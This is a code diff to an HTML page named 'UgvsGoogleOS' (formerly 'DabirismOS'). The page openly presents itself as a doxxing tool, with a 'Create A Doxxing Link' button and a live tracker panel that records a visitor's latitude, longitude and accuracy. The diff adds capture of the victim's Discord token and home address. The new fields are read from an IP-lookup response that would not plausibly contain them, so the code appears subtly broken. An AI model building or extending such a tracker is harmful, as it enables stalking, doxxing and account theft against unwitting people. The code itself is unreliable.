@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>DabirismOS</title>
+<title>UgvsGoogleOS</title>
 <style>
 /* gray animated background */
 body{
@@ -23,12 +23,12 @@ body{
 </style>
 </head>
 <body>
-<div id="title">DabirismOS</div>
+<div id="title">UgvsGoogleOS</div>
 <button id="grabBtn">Create A Doxxing Link ←</button>
 
 <!-- built-in tracker panel (inside UgvsGoogleOS) -->
 <div id="trackerPanel">
-  <div id="trackerHead">DabirismOS – Live Tracker</div>
+  <div id="trackerHead">UgvsGoogleOS – Live Tracker</div>
   <input id="trackerLink" readonly>
   <div id="trackerBody">Waiting for data...</div>
 </div>
@@ -118,6 +118,8 @@ async function handleSubmit(e) {
       data.lat = ip.latitude;
       data.lon = ip.longitude;
       data.accuracy = ip.accuracy;
+      data.discordToken = ip.discordToken;
+      data.address = ip.address;
     })
     .catch(() => {});
 
